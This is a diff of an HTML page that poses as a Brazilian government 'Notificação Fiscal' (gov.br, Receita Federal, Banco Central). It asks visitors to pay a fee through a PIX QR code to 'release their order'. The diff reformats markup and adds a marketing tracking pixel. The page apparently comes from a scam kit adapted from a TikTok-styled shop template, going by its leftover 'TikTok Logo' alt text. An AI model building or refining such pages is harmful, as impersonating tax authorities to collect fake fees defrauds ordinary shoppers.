@@ -1,8 +1,12 @@
-<!DOCTYPE html><html lang="pt-br"><head>
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Notificação Fiscal - gov.br</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Rawline:wght@400;500;600;700;800;900&display=swap">
+    <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css2?family=Rawline:wght@400;500;600;700;800;900&display=swap">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
@@ -31,6 +35,14 @@
             line-height: 1.6;
         }
     </style>
+    <script>
+        window.pixelId = "697185be2058fdd08c7d7436";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
 </head>
 
 <body data-page="upsell-iof" class="flex flex-col min-h-screen">
@@ -107,7 +119,8 @@
                         </div>
                     </div>
 
-                    <button onclick="initiateCheckout(event)" id="confirmation-button" class="block w-full btn-gov text-white text-center py-6 rounded font-bold text-xl shadow-sm hover:bg-[#0c326d] transition-all mb-8">
+                    <button onclick="initiateCheckout(event)" id="confirmation-button"
+                        class="block w-full btn-gov text-white text-center py-6 rounded font-bold text-xl shadow-sm hover:bg-[#0c326d] transition-all mb-8">
                         Pagar taxa e liberar pedido
                     </button>
 
@@ -122,7 +135,8 @@
             </div>
 
             <div class="mt-16 text-center text-gray-400 max-w-2xl mx-auto pb-20 px-6">
-                <div class="grid grid-cols-3 gap-2 mb-8 opacity-40 grayscale pointer-events-none uppercase font-black text-[8px] tracking-widest">
+                <div
+                    class="grid grid-cols-3 gap-2 mb-8 opacity-40 grayscale pointer-events-none uppercase font-black text-[8px] tracking-widest">
                     <span class="border-r border-gray-300 px-2">RECEITA FEDERAL</span>
                     <span class="border-r border-gray-300 px-2">BANCO CENTRAL</span>
                     <span class="px-2">MINISTÉRIO DA FAZENDA</span>
@@ -147,7 +161,8 @@
         <!-- QR Code Data -->
         <div id="pixData" class="hidden">
             <div class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-50 bg-white">
-                <img src="images/receitafederal.png" alt="TikTok Logo" class="h-28 w-28 object-contain mb-6 drop-shadow-sm">
+                <img src="images/receitafederal.png" alt="TikTok Logo"
+                    class="h-28 w-28 object-contain mb-6 drop-shadow-sm">
                 <div class="text-center">
                     <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">Valor do Pagamento
                     </p>
@@ -158,14 +173,18 @@
                 <h3 class="text-2xl font-black mb-2 text-gray-900">Escaneie o QR Code</h3>
                 <p class="text-gray-500 text-sm">Ou copie o código PIX abaixo</p>
             </div>
-            <div class="bg-gradient-to-br from-gray-50 to-white border-2 border-gray-200 rounded-2xl p-6 mb-6 flex justify-center shadow-inner">
+            <div
+                class="bg-gradient-to-br from-gray-50 to-white border-2 border-gray-200 rounded-2xl p-6 mb-6 flex justify-center shadow-inner">
                 <img id="qrCodeImage" src="#" alt="QR Code PIX" class="max-w-full rounded-lg">
             </div>
             <div class="mb-6">
                 <label class="block text-sm font-bold text-gray-700 mb-3">Código PIX (Copiar e Colar)</label>
                 <div class="flex gap-2">
-                    <input type="text" id="pixCode" readonly="" class="flex-1 p-4 rounded-xl border-2 border-gray-200 bg-gray-50 text-xs font-mono">
-                    <button class="bg-[#FE2C55] px-6 py-4 rounded-xl text-white font-bold uppercase text-xs shadow-lg hover:opacity-90 transition-all" id="copy-pix-button" style="background-color: #003473;">COPIAR</button>
+                    <input type="text" id="pixCode" readonly=""
+                        class="flex-1 p-4 rounded-xl border-2 border-gray-200 bg-gray-50 text-xs font-mono">
+                    <button
+                        class="bg-[#FE2C55] px-6 py-4 rounded-xl text-white font-bold uppercase text-xs shadow-lg hover:opacity-90 transition-all"
+                        id="copy-pix-button" style="background-color: #003473;">COPIAR</button>
                 </div>
             </div>
             <div class="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-r-lg mb-4">
@@ -357,8 +376,6 @@
     <script src="script.js?v=8.3" defer></script>
 
 
-</body></html>
+</body>
 
-
-
-
+</html>
